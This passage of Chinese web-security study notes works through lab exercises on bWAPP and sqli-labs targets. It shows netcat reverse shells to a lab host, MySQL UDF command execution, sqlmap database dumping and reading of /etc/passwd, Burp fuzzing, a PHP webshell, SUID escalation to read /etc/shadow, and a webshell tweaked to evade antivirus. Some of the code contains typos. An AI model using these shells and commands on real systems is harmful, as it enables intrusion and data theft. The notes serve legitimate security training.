    - 出现错误 local listen fuxored: INVAL
    - 使用新命令，nc -l -p 8888
  - bWAPP 连接主机端口，nc 192.168.1.102 8888
    - 如果连接成功，都会被卡住，此时在主机中输入内容，在 bWAPP 中也可以看到
  - bWAPP 连接主机端口，并且执行bash 交互式命令行，nc 192.168.1.102 8888 -e /bin/bash
    - 如果连接成功，都会被卡住，此时在主机中输入命令，就可以直接下下面展示出来结果
    - 如输入：pwd;ls;whoami 等
  - 在浏览器中输入，http://127.0.0.1/images/cmd2.php?cmd=nc 192.168.1.102 8888 -e /bin/bash
    - 注意，需要保证主机一定在监听 8888 端口，不然会报错 Connection refused，表现为无法测试
    - 此时就可以看到浏览器一直在转圈圈，表示 nc 连接上了
    - 此时，就可以直接在 nc 的监听中直接连接 bWAPP，并且执行命令了
      - pwd
      - ps -ef
      - whoami





#### UDF 命令执行

- MySQL公共库位置 
  - 命令，show variables like '%plugin%';
  -  plugin_dir    | /usr/lib/mysql/plugin/
  - 进入目录，cd /usr/lib/mysql/plugin/
  - 给 plugin 文件夹权限
    - cd ..
    - chmod -R o+w plugin/  # 给plugin文件夹的其他用户操作添加写权限，保证可以写入.so数据
- 获取的lib_linux.so文件十六进制编码 
  - 下载，https://github.com/sqlmapproject/sqlmap
  - 进入，\sqlmap\extra\cloak 
  - 执行 python cloak.py -d -i E:\39-网络安全\HackerMeSourceCode\sqlmap\data\udf\mysql\linux\32\lib_mysqludf_sys.so_ -o lib_linux.so
  - 获得 lib_linux.so 文件
  - 在mac 上，使用 ruby 进行十六进制编码
  - 进入交互式环境，irb
  - 输入，irb(main):001:0> File.read("lib_linux.so").unpack("H*");  ，获得输出内容
- 导入UDF 
  - 进入 mysql 交互式环境
  - 输入，select unhex('???') into dumpfile '/usr/lib/mysql/plugin/lib_linux.so';
  - 将其中的 ??? 替换成 lib_linux.so文件的十六进制编码，就可以写入到对应的插件文件夹中
- dumpfile v.s. outfile 
  - 若我们想把一个 可执行 2进制文件用 into outfile 函数导出，实际上 导出后 文件就会被破坏
  - 因为 into outfile 函数会在行末端写入新行，更致命的是会转义，换行符， 这样的话这个2进制可执行文件就会被破坏
  - 这时候 我们使用 into dumpfile 就能导出 一个完整能执行的 2进制文件 into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理
- UDF上传到指定目录后创建执行命令 
  - create function sys_eval returns string soname "lib_linux.so";
  - 注意：我在这里运行报错了，没有完成该UDF的测试
- 命令执行 
  - select sys_eval('ps -ef');
  - select sys_eval('whoami');
  - select sys_eval('ifconfig');
- 自动化工具 
  - sqlmap 提供参数进行命令执行和shell获取
  - sqlmap.py –u “url” --os-shell
  - sqlmap.py –u “url” --os-cmd=ifconfig 



#### 防御措施 

- 除了对SQL注入本身的检测之外：
  - 服务器内的文件夹的权限管理
  - 以最小权限应用服务，如apache服务 



### Linux 权限控制 

#### 用户和组定义

用户组在 Linux 系统上起着重要作用，它们为选定的用户提供了一种彼此共享文件的简便方法。

它们还使系统管理员可以更有效地管理用户权限，因为他们可以将权限分配给组而不是单个用户。 





#### Linux 平台下的用户 

Linux 用户分为管理员和普通用户，普通用户又分为系统用户和自定义用户。 

1. 系统管理员：即 root 帐户，UID 号为 0，拥有所有系统权限，它类似于 Windows 系统中的 administrator 帐户，是整个系统的所有者。
2. 系统用户：Linux 为满足自身系统管理所内建的账号，通常在安装过程中自动创建，不能用于登录操作系统。UID 在 1-499 之间（CentOS 7 为 1-999之间）。像上面的 sshd、pulse 等等用户，即是此类用户。它类似于 Windows 中的 system 帐户，当然权限远没有 system 帐户高。
3. 自定义用户：由 root 管理员创建供用户登录系统进行操作使用的账号，UID 在 500 以上（CentOS 7为 1000 以上)。它类似于 Windows 系统中 users 用户组中的帐户 。 





#### /etc/passwd 

![1617713143460](HackerMeWeb.assets/1617713143460.png)



#### /etc/passwd 解析

- 解析第一行的内容：`root:x:0:0:root:/root:/bin/zsh`
- 用户的登录 Shell 可以指定为某个特定的程序（此程序不是一个命令解释器）。
- 利用这一特点，我们可以限制用户只能运行指定的应用程序，在该应用程序运行结束后，用户就自动退出了系统。
- 有些 Linux 系统要求只有那些在系统中登记了的程序才能出现在这个字段中。 

| 关注点    | 解释                                                         | 详细描述                                                     |
| --------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| root      | 注册名（login_name）：用于区分不同的用户。                   | 在同一系统中注册名是惟一的。在很多系统上，该字段被限制在8个字符的长度之内。并且要注意，通常在Linux系 统中对字母大小写是敏感的，登录名中不能有冒号(:)，因为冒号在这里是分隔符。 |
| x         | 口令（passwd）：一些系统中，存放着加密后的用户口令字。       | 虽然这个字段存放的只是用户口令的加密串，不是明文， 但是由于/etc/passwd文件对所有用户都可读，所以这仍 是一个安全隐患。因此，现在许多Linux系统（如SVR4） 都使用了shadow技术，把真正的加密后的用户口令字存 放到/etc/shadow文件中，而在/etc/passwd文件的口令 字段中只存放一个特殊的字符，例如“x”或者“*”。超 级用户root可以使用系统命令passwd来更改系统中所有 用户的口令，普通用户也可以在登录系统后使用passwd 命令来更改自己的口令。 |
| 0         | 用户标识号(UID)：是一个整数，系统内部用它来标识用户          | 一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把它们视为同一个用户，但是它们可以有不同的口令、不同的主目录以及不同的登录Shell等。取值范围是0-65535。0是超级用户root的标识号，1-99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。 |
| 0         | 组标识号(GID)：这是当前用户的工作组标识                      | 具有相似属性的多个用户可以被分配到同一个组内，每个组都有自己的组名，且以自己的组标 识号相区分。像UID一样，用户的组标识号也存放在passwd文件中。在现代的Unix/Linux中，每个用户可以同时属于多个组。除了在passwd文件中指定其归属的基本组之外，还在/etc/group文件中指明一个组所包含用户。 |
| root      | 注释性描述(users)：字段记录着用户的一些个人情况。            | 这个字段并没有什么实际的用途，在许多Linux 系统中，这个字段存放的是一段任意的注释性 描述文字，用做finger命令的输出。 |
| /root     | 用户主目录(home_directory)：也就是用户的起始工作目录，它是用户在 登录到系统之后所处的目录。 | 在大多数系统中，各用户的主目录都被组织在 同一个特定的目录下，而用户主目录的名称默 认就是该用户的登录名。各用户对自己的主目 录有读、写、执行（搜索）权限，其他用户对 此目录的访问权限则根据具体情况设置。 |
| /bin/bash | 登录Shell(Shell)：用户登录后，要启动一 个进程，负责将用户的操作传给内核，这 个进程是用户登录到系统后运行的命令解 释器或某个特定的程序，即Shell。 | Shell是用户与Linux系统之间的接口。Linux的Shell有许多种，每种都 有不同的特点。常用的有sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS- 20typeCShell),bash(BourneAgainShell)等。系统管理员可以根据系 统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统 使用sh为默认的登录Shell，即这个字段的值为/bin/sh。而当用户 shell类型为/sbin/nologin,则是该用户无法登陆系统。 |



#### Linux平台下的用户组 

- 在 Linux 中的每个用户必须属于一个组，不能独立于组外。
- 在 Linux 中每个文件有所有者、所在组、其它组的概念。
- 同样，用户组的信息我们可以在 /etc/group 中查看。 



#### /etc/group 

![1617713167601](HackerMeWeb.assets/1617713167601.png)



#### /etc/group 解析 

- 解析第一行的内容：`root:x:0:`
- Linux 组的类别：
  - 用户的主要组（primary group）：用户必须属于一个且只有一个组
  - 用户的附加组（supplementary group）：一个用户可以属于一个或者零个附加组 

| root | 组名            |
| ---- | --------------- |
| x    | 组密码          |
| 0    | 组标识号（GID） |
|      | 附加组成员      |



#### Linux 平台下的用户密码 

- /etc/shadow 是/etc/passwd 的密码映射过去产生的文件，因为 /etc/passwd 为所有用户都可读的文件所以会导致用户密码不安全，而 /etc/shadow 文件只有 root 能看，其他用户不能访问。
- pwconv 将 passwd 当中的密码映射到了 /etc/shadow。
- pwunconv 取消映射，密码仍然放在 /etc/passwd 当中。 



####  /etc/shadow

![1617714390131](HackerMeWeb.assets/1617714390131.png)



####  /etc/shadow 解析

- 解析：`root:!!:18363:0:99999:7:::`
- 登录用户名：用户密码（！！表示没有设置密码）：从1970年1月1日起到密码最近一次被更改的时间。
- 密码再过几天可以被更改（0表示可以随时被修改）：密码再过几天必须被更改（99999表示
  99999天后过期）。
- 密码过期前几天系统提醒用户（默认为一周）：密码过期几天后账号会被锁定：从1970年1月1日算起，多少天后账号失效。 



#### Linux 平台下的用户/组操作 

- 由于各种原因，用户可以成为多个“组”的成员。
- “组”的成员资格使用户可以访问组拥有的文件和目录，有时这种行为很关键。
- 要生成某些用户所属的组的列表，可以使用groups命令。 
  - groups centos
- How to add users to groups
  - If you want to add an existing user to another group, you can do that with a command like this:
  - `sudo usermod -a -G devops jdoe`
  - eg:
    - groups centos
    - usermod -a -G root centos
    - groups centos





#### 文件

- Linux 操作系统中，一切皆文件。
  - 普通文件
  - 目录
  - 设备
  - 套接字 
- 文件分类

| 所有者 | 一般为文件的创建者，谁创建了该文件，就天然的成为该文件的所有者也可 以使用chown 用户名 文件名来修改文件的所有者。 |
| ------ | ------------------------------------------------------------ |
| 所在组 | 当某个用户创建了一个文件后，这个文件的所在组就是该用户所在的组 也可以使用 chgrp 组名 文件名来修改文件所在的组。 |
| 其他组 | 除开文件的所有者和所在组的用户外，系统的其它用户都是文件的其它组。 |



#### ls -al 命令

- 例子：`-rw-r--r-- 1 root root 690 May 22 17:06 index.php`

- 第一个符号：
  - `-`  ：普通文件
  - c ：字符设备：键盘，鼠标
  - b ：块设备：硬盘，软盘
  - s ：套接字：数据通信
  - d ：目录
  - l ：符号连接 
- rwx 对目录（读|写|执行）
  - 创建两个用户 mktest，test
  - useradd mktest -p test 
- rwx 对文件 （读|写|执行）
  - sh 1.sh vs ./1.sh 
  - $$ ：当前脚本环境id 
  - dd if=/dev/zero of=./test.sh bs=6 count=1 
  - 可执行=权限+内容 



#### 修改权限&用户

- chmod u-w,g-r,o-x 1.sh
- chmod 536 1.sh 
  - u：用户
  - g：组
  - o：其他
  - a：所有用户
  - 5：r-x
  - 3：-wx
  - 6：rw-
- 高权下 root：
  - chown test:test 1.sh 



#### 普通权限管理

- root 是 Linux 和 Unix 系统中的超级管理员用户帐户，前面所讲的普通权限约束不适用于 root 账号。
- 黑客拿到 root 权限 ，破坏力极强



#### 隐藏权限

- chattr 是一个 root 账号才能执行的指令
- chattr +i 1.sh 文件不可替换删除（包括root） chattr -i 1.sh
- chattr +a 1.sh 文件只能增加内容（包括root） chattr -a 1.sh
- lsattr 能查看文件的隐藏权限信息 



#### 特殊权限

- SUID
  - ls -al /usr/bin/passwd
- SGID
  - ls -al /usr/bin/mlocate 
- SBIT 
  - ls -al / | grep tmp





### 自动化注入 

#### sqlmap 工具

- 一款功能强大集成了多种数据库识别及注入方式，多用于识别和利用Web 应用程序注入漏洞的工具。
- 优点在于**集成了大量 payload**,对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。
- payload 原理与前面 SQL 注入相似，利用数据库执行非预期的语句，但更加复杂，由专门研究数据库的人编写。Kali 操作系统内置，其他平台需下载脚本文件。 
- 不仅包含了前面所说几种 MySQL 的 SQL 注入利用方式，还包含了其他种类的数据库的。
- 前面写的 Python 时间盲注脚本，也算一个自动脚本，具有相应的针对性，但是功能无 sqlmap 强大。 
- 官网：http://sqlmap.org/ 



#### sqlmap 特性 

- 对如下 DBMS 的全面支持：
  - MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2,SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, MemSQL, TiDB,CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift,Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle,Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB and FrontBase
- 对六种 SQL 注入技巧的全面支持：
  - boolean-based blind, time-based blind, error-based, UNION query-based,stacked queries and out-of-band 
- 对直连数据库的支持：
  - 不需要通过 SQL 注入，只需要提供 DBMS 的账户信息、IP地址、端口及数据库名称。
- 对枚举功能的支持：
  - 包括用户、密码 HASH、权限、角色、数据库、数据表、数据列。
- 密码 HASH 相关支持：
  - 自动识别 HASH 格式以及自动实施基于字典的破解攻击。
- 对 DUMP 数据的功能支持：
  - 可以根据用户选择进行全部导出/部分导出。 
- 对搜索功能的强大支持：
  - 该功能非常实用，可用于搜索特定数据库名、所有数据库中的特定名称数据表、所有数据表中特定名称的数据列。
- 对下载/上传文件的支持：
  - 有效支持的 DBMS 包括 MySQL、PostgreSQL、MS SQL Server。
- 对命令执行的支持：
  - 有效支持的 DBMS 包括 MySQL、PostgreSQL、MS SQL Server。
- 对建立一个基于OOB的TCP连接的支持：
  - 连接的 Channel 支持交互式命令行、Meterpreter session 以及 VNC session。
- 对数据库提权的支持：
  - 该支持通过 msf 中 meterpreter 的 getsystem 命令 



#### sqlmap 的选项

-  选项 -v
  -  0 ： 只显示 python 的 error 和 critical 级别的信息
  -  1 ： 显示 information 和 warning 级别的信息
  -  2 ： 显示 debug 级别的信息
  -  3 ： 额外显示注入的 payload （很有用，测试过程的记录）
  -  4 ： 额外显示 HTTP 请求内容
  -  5 ： 额外显示 HTTP 响应头
  -  6 ： 额外显示 HTTP 响应页面内容 
-  选项 -d
   -  通过 sqlmap 直接连接一个数据库实例，该选项接收一个连接字符串作为参数
   -  示例：
      -  DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME (MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.)
      -  DBMS://DATABASE_FILEPATH (SQLite, Microsoft Access, Firebird, etc.) 
-  选项 -u 或 --url
   -  选定一个 url 目标，并执行 SQL 注入攻击
   -  示例：
      -  python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
-  选项 -d 或 --data
   -  默认的 HTTP 请求发送方式是 GET，可以通过该选项指定为 POST
   -  示例：
      -  python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users 
-  选项 --cookie, --cookie-del, --load-cookies
   -  设定 Cookie 流程：
      -  通过浏览器登录Web App；
      -  从 Burp Suite 或浏览器内部取得 Cookie；
      -  通过 --cookie 选项设置取得的 Cookie；
   -  说明：
      -  在 sqlmap 执行注入攻击的过程中，如果浏览器返回了 Set-Cookie的headers，那么 sqlmap 会自动识别这一指令，并更新对应的 Cookie，如果我们已经通过 --cookie 设定了Cookie 的数值，那么 sqlmap 会向我们确认是否进行更新。 
-  选项 --user-agent 或 --random-agent
   -  默认情况下，sqlmap 发送的 HTTP 请求中 User-Agent 值如下：
      -  sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
      -  可通过该选项进行修改
   -  思考：
      -  我们前几节课讲过一次关于 HTTP 头注入，那么通过 sqlmap 是否可以自动化呢？
      -  Host 及 Referer 是否也可以设置及注入呢？ 
-  选项 --proxy
   -  在实战场景下非常重要，允许 sqlmap 的请求都通过我们设置的 proxy 进行发送，无论是出于隐藏自身 IP 地址的目的，还是绕过 IP 限制，都非常实用。
-  选项 --tor, --tor-port, --tor-type 以及 --check-tor
   -  通过配置 Tor Client 以及 Privoxy，我们就可以启用 –tor 选项。
   -  该选项可以使得 sqlmap 的请求通过 Tor 网络进行发送，以达到匿名的目的。
   -  同时，我们还可以通过 --tor-port 以及 --tor-type 设置所使用的的 Tor Proxy 类型。
   -  --check-tor 则是用来检测 Tor 网络是否配置且连接正常。 





#### 携带 cookie 实战

- bWAPP 漏洞选择：

  - SQL Injection (GET/SELECTED)

- 实战内容：

  1. 设定 Cookie 给 sqlmap；
  2. 自动化注入获取数据库信息（包括数据库账号、用户名、密码）。

- 测试步骤

  -  登录靶机，选择漏洞，打开浏览器控制台，在网络中进行抓包，获得 cookie，Cookie: csrftoken=ARDPhdClAyvSmEJcAmE953XMbXI527GrUDAbbHZ1sIpUwsYaW8MBwDaFBd4ksUu1; security_level=0; PHPSESSID=s1fmkgfcs8tfqhosqbjak6ijb2

  - 下载 sqlmap ，网址：http://sqlmap.org/

  - 进入 sqlmap，输入： python .\sqlmap.py --cookie "security_level=0; PHPSESSID=s1fmkgfcs8tfqhosqbjak6ijb2" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -f --banner --dbs --users

  - 输出结果显示

    - ```sh
      web server operating system: Linux Ubuntu
      web application technology: Apache 2.4.7, PHP 5.5.9
      back-end DBMS operating system: Linux Ubuntu
      back-end DBMS: active fingerprint: MySQL >= 5.5
                     comment injection fingerprint: MySQL 5.5.47
                     banner parsing fingerprint: MySQL 5.5.47
                     html error message fingerprint: MySQL
      banner: '5.5.47-0ubuntu0.14.04.1'
      
      database management system users [5]:
      [*] 'admin'@'%'
      [*] 'root'@'127.0.0.1'
      [*] 'root'@'::1'
      [*] 'root'@'fffcfba80832'
      [*] 'root'@'localhost'
      
      available databases [4]:
      [*] bWAPP
      [*] information_schema
      [*] mysql
      [*] performance_schema
      ```



#### user-agent 实战

- bWAPP 漏洞选择：
  - SQL Injection – Stored (User-Agent)
- 实战内容：
  - 修改 User-Agent；
  - 自动化注入 User-Agent； 
- 测试步骤
  -  登录靶机，选择漏洞，打开浏览器控制台，在网络中进行抓包，获得 cookie，Cookie: csrftoken=ARDPhdClAyvSmEJcAmE953XMbXI527GrUDAbbHZ1sIpUwsYaW8MBwDaFBd4ksUu1; security_level=0; PHPSESSID=s1fmkgfcs8tfqhosqbjak6ijb2
  - 进入 sqlmap，输入： python .\sqlmap.py --cookie "security_level=0; PHPSES
    SID=s1fmkgfcs8tfqhosqbjak6ijb2" -u "http://127.0.0.1/sqli_17.php" -f --banner --dbs --users
    - 进入浏览器刷新后，可以看到 **User-Agent** 是 sqlmap/1.5.4.5#dev (http://sqlmap.org)
  - 继续输入，python .\sqlmap.py --cookie "security_level=0; PHPSES
    SID=s1fmkgfcs8tfqhosqbjak6ijb2" -u "http://127.0.0.1/sqli_17.php" --user-agent 'helloworld' -f --banner --dbs --users
    - 刷新后，可以看到  **User-Agent** 是 helloworld
    - 实现了 user-agent 的更改
  - 注入测试，输入 python .\sqlmap.py --cookie "security_level=0; PHPSES
    SID=s1fmkgfcs8tfqhosqbjak6ijb2" -u "http://127.0.0.1/sqli_17.php" -f --banner --dbs --users -v 3
    - 会报错，直接停止
  - 更改后，输入 python .\sqlmap.py --cookie "security_level=0; PHPSES
    SID=s1fmkgfcs8tfqhosqbjak6ijb2; security=low" -u "http://127.0.0.1/sqli_17.php" -f --banner --dbs --users -v 3 --level 3
    - 添加 level 的数值，完成注入
    - 看到数据库的信息，表的信息，用户的信息，但是需要花费好长时间
  - 测试，此时不输入level的时候，python .\sqlmap.py --cookie "security_level=0; PHPSES
    SID=s1fmkgfcs8tfqhosqbjak6ijb2; security=low" -u "http://127.0.0.1/sqli_17.php" -f --banner --dbs --users -v 3
    - 很快就给出了结果，这个结果是直接从本地缓存的文件中获得
    - SQLMap的默认输出路径是在
      - C:/Users/用户名/.sqlmap/output/下的。
      - 但是我在windows中没找到，很不解！
      - 最终被我发现了，每一次的内容会被保存在这个目录下，C:\Users\rmliu\AppData\Local\sqlmap\output\127.0.0.1



#### sqli-labs 靶机实战

- 下载安装靶机，启动 docker start fervent_nightingale
- 选项 -g google hacking 
  - python sqlmap.py -g "inurl:.jsp?id=12"
  - python sqlmap.py -g "inurl:.php?id=12" 
- 选项 --risk=1-3 --level=1-5 
  - 默认都是一, 
  - level 级别升高，会加更多的测试，2 会加 cookie 的测试，3 会加 Useragent 头的注入测试
  - 检测 host 头注入点的是：5
  - sql-master/data/xml/payloads 目录下有详细的 payload。
  - 内容 risk 级别升高会加 or 和 Update 可能对数据库表内容进行修改。往往不是我们所期望的，所以谨慎使用。
  - 如果不输入 ？id=1 sqlmap 自动指定参数，可以观察到大量 payload，而 risk 1 level 1会直接退出。 
  - 测试
    - python sqlmap.py -u "http://127.0.0.1/Less-31/?id=1" --risk 3 --level 5
      - 可以注入

    - python sqlmap.py -u "http://127.0.0.1/Less-31/"
      - 尝试一些后迅速退出

    - python sqlmap.py -u "http://127.0.0.1/Less-31/" --risk 3 --level 5 
      - 大量payload,尝试所有可能的注入点 
- 选项 --privileges --is-dba 
  - python sqlmap.py -u "http://127.0.0.1/Less-31/?id=1" --is-dba 
    - current user is DBA: True
  - python sqlmap.py -u "http://127.0.0.1/Less-31?id=1" --privileges
- 选项 --file-read --file-write --file-dest 
  - python sqlmap.py -u "http://127.0.0.1/Less-31?id=1" --file-read "/etc/passwd"
    - cat C:\Users\rmliu\AppData\Local\sqlmap\output\127.0.0.1\files\_etc_passwd
    - 可以看到对应的数据内容
  - 本地写入一个 ip.txt 的文件，cat .\ip.txt
    - python sqlmap.py -u "http://127.0.0.1/Less-31?id=1" --file-write ".\ip.txt" --file-dest "/tmp/ip.txt"
    - 进入靶机的docker中，docker exec -it fervent_nightingale bash
    - 可以看到同样的内容，cat /tmp/ip.txt
- 选项 --os-cmd --shell 
  - 需要具有文件夹写权限（root 更好）
  - 网站的路径，里面提供部分默认选项
  - PHP 主动转义的功能关闭 (magic_quotes_gpc) 
  - 测试
    - python sqlmap.py -u "http://127.0.0.1/Less-31?id=1" --os-shell
    - 可以直接进行交互式测试，我在演示测试的时候，失败了！



#### sqlmap 脱库实战

- 启动 bWAPP 靶机，选择bug类型：Choose your bug: SQL Injection (GET/Select)
- 打开浏览器控制台，获取 cookie
- 设置 level 3 测试
  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" --level 3
- 获取数据库名称
  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -dbs
  - 枚举了数据有哪些 
- 获取bWAPP 数据库的所有数据表
  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -dbs -D bWAPP -tables
  - 指定了具体数据库的同时指定了数据表 
- 获取 users  数据表的所有列
  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -dbs -D bWAPP -tables -T users --columns
- 获取用户表中 login,password 列 schema
  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -dbs -D bWAPP -tables -T users -columns -C login,password
- 密码爆破
  - 在显示表的情况下，使用了默认密码字典进行 Hash 转换，如果默认的密码字典不足，到网上有专门的 md5 彩虹表碰撞网站。
- 脱库 
  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -dbs -D bWAPP -tables -T users -columns -C login,password -dump-all
  - 使用工具的 –dump-all 参数能轻松的把整个数据库数据窃取，也就是脱库。 
  - 此时就可以去本机查看输出的结果了，table 'bWAPP.movies' dumped to CSV file 'C:\Users\rmliu\AppData\Local\sqlmap\output\127.0.0.1\dump\bWAPP\movies.csv'
  - 在这个过程中，由于会在本机进行彩虹表碰撞，速度较慢，耐心等待！



### 自动化注入之 FuzzDB + Burp 

#### FuzzDB

- 一个开源的应用程序模糊测试数据库，包含了各种攻击 payload 的测试用例集合。
- OS 命令注入，目录遍历，文件上传绕过，身份验证绕过，XSS，SQL 注入，HTTP 头注入、CRLF 注入，NoSQL 注入等功能。
- 还包含了一些用不同语言写成的 webshell 与常用的账号密码字典。 
- 下载：https://github.com/fuzzdb-project/fuzzdb



#### CTF 靶机 

- SQLi-CTF：A training CTF covering non-blind SQL injection techniques
- `git clone https://github.com/Corb3nik/SQLi-CTF`
- `cd SQLi-CTF`
- `docker-compose up`
- 浏览器访问，http://127.0.0.1:12000/



#### Burp 实战

- 安装 CTF 靶机，并启动
- 进入网址，http://127.0.0.1:12000/level2.php
- 启动 burp Suite，设置 Target ---> Scope ---> Use advanced scope control  ---> Add ---> xforburp.com 12000  ---> ok
- 关闭 Proxy ---> Intercept ---> Intercept is off
- 浏览器访问，http://xforburp.com:12000/
  - 由于我本机问题，借助了 Switchhost 工具，进行域名与IP 的对应
- 进入 level 2
  - http://xforburp.com:12000/level2.php
  - 但是测试 burp 没有监测到内容，查看路径 Proxy  ---> HTTP history，后续的 Intruder 也就没法实现了，懵逼~
- 假设可以监测到请求，在 level 2 的页面中，随便输入一个用户名和密码，就会在 burp 中看到一个 POST 请求
  - 右键，Send to Intruder
- 进入Intruder ，更改请求中的注入 Positions 为 username
  - 这里对 uname 一个地方加符号，表示用 payload 替换。
- 设置 Attack type 为 Sniper
  - sniper 狙击手，使用单一词典，每次仅变更一个参数，如果 uname、password 都是变量，会先让uname 遍历字典，password 不变，后变 password，uname 不变。
  - Battering ram 攻城锤, 使用单一词典，有多个变量，同时变更为同一值。
  - Pitchfork 音叉，每个变量一个字典。一次失败后，三个变量同时改变，一个变量不会与另一个变量所有情况匹配到。
  - Cluster bomb 集束炸弹，笛卡尔积，形式，每隔一个变量要与另一个变量所有情况测试到，在多个字典情况下，测试时间非常漫长。 
- 在 Payloads 中的 Payload Opyions[Simple list] 中，load 文件 ...\fuzzdb\attack\sql-injection\detect\xplatform.txt 
  - 此时就可以开电脑所有的SQL注入攻击测试例子
  - 如果测试用例过多。可以在 option 选项对线程数目进行设定。 
- 点击 Start attack
  - 会弹出一个对话框
  - 观察 Length 列，出现了1858,1846和1500 等多种长度
  - 不同的长度反应了注入的结果不一样，对比不同的长度，可以找到注入成功的示例
- 注入测试
  - 图示加载了多个字典，发现了多个攻击脚本能够渗透完成 。
  - 字典里面含有这些符号，目的是用于测量服务端和 WAF 哪些符号是被过滤的，然后针对过滤的参数进行修改 payload，比如 sqlmap 的 tamper 参数。
  - 在遇到一些特殊情况，也可以针对具体的情况编写脚本进行注入。
  - 这里由于是测试平台，返回的状态都是 200 ，实际使用渗透过程中服务器响应，WAF 拦截，报错，会响应各种状态码，可以通过状态码筛选正确的 payload，直接或间接利用。
  - 这里通过长度大小来判断哪些是成功注入的，发现多个成功注入，这里的长度是返回页面的长度大小。 



### Webshell 

#### Webshell 定义

- Webshell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种代码执行环境，也可以将其称做为一种**网页后门**。
- 攻击者在入侵了一个网站后，通常会将 asp 或 php 后门文件与网站服务器 Web 目录下正常的网页文件混在一起，然后就可以使用浏览器来访问 asp 或者 php 后门，得到一个命令执行环境，以达到控制网站服务器的目的。 



#### Webshell 作用

1.维持远程访问

2.权限提升

3.发动网络攻击 



#### Webshell - 维持远程访问 

- <?php @eavl($_REQUEST[’cmd’]);?>
- 一句话木马就是最典型的 WebShell
- 通过一句话木马就可以远程访问服务器并执行命令
- 通过对该文件传入相应的命令就可以在服务器上执行该命令 
- 测试链接
  - http://127.0.0.1/test.php?cmd=phpinfo();



#### Webshell - 权限提升 

- 当我们通过 Webshell 执行命令的时候通常只有 WWW 权限 

  - http://127.0.0.1/test.php?cmd=system('whoami');
  - 返回：www-data

- 这里介绍一种使用 SUID 提权的方式

  - 通过下面的命令找到机器上具有 SUID 权限的文件

    - http://127.0.0.1/test.php?cmd=system(“find / -user root -perm -4000 -print 2> /dev/null"); 
    - 只要出现的目录中存在 `/usr/bin/find` 就很好

  - 在当前工作目录下创建一个 pentestlab 文件

    - http://127.0.0.1/test.php?cmd=system("touch pentestlab;"); 

  - 执行下面的命令查看权限 

    - http://127.0.0.1/test.php?cmd=system("find pentestlab -exec whoami \;"); 
      - 此时就会出现 root 权限的结果，但是请求用户并不是，就实现了提权

  - 通过 find 执行的命令都是以 root 权限运行的

    - http://127.0.0.1/test.php?cmd=system(“cat /etc/shadow"); 
      - 此时是 www-data 权限，无法创建文件
    - http://127.0.0.1/test.php?cmd=system("find pentestlab -exec cat /etc/shadow \;"); 
      - 此时是 root 权限，可以获得shadow文件的内容

  - SUID 权限

    - Linux 环境下的一种除了 rwx 之外的附加权限 ，属于特殊权限
    - 查看命令：`ls -l /usr/bin/find`

    ![1617875142059](HackerMeWeb.assets/1617875142059.png)

  - 提权过程分析 

    ![1617875168763](HackerMeWeb.assets/1617875168763.png)



#### WebShell - 网络攻击 

- 这里以第三方攻击为例 

  ![1617875254582](HackerMeWeb.assets/1617875254582.png)

- 为了看到攻击效果，在服务器 A 上存在如下的程序 

  ```php
  <?php
      $content = $_GET['content'];
      $file = fopen('content.txt', 'w');
      $ip = $_SERVER['REMOTE_ADDR'];
      fwrite($file, $ip);
      fwrite($file, '-');
      fwrite($file, $content);
      fclose($file);
  ?>
  ```

- 访问服务器 A上的 http.php 文件

  - http://192.168.25.173/http.php?url=http://192.168.25.169/test.php?content=‘hello,world’ 

- 服务器 B 上生成如下文件 

  ```sh
  192.168.25.173-hello,world
  ```

  



#### 免杀 Webshell 

##### 免杀基础

-  `<?php @eval($_REQUEST['cmd']);?> ` 
  - 在实际的系统中，一旦书写的文件包含上的内容，就会被认定为网页木马，被杀毒软件发现
- 杀毒软件的原则
  - 目前的安全产品对于木马查杀使用的是**正则匹配**的方式，因此我们要做到免杀首先要清楚安全防护软件匹配的内容。
  - eval 是一个危险函数，但是并不是简单的只是匹配 eval，通过测试发现，单纯的 eval 并不会被过滤，实际过滤的的内容为：
  - <?assert($_REQUEST[;?>
  - <?eval($_REQUEST[;?> 



##### 免杀 - 常量定义 

- ```php
  <?php
      define("a", "$_REQUESTP[cmd]");
  	eval(a);
  ?>
  ```

- 上面的代码通过定义常量的方式将 eval 与 `$_REQUEST` 进行了拆分

- 经测试该代码可以绕过 WAF 的检查

- 同时在执行的时候 a 会被替换为 `$_REQUEST[cmd]`

- 能够完成 Webshell 的功能 



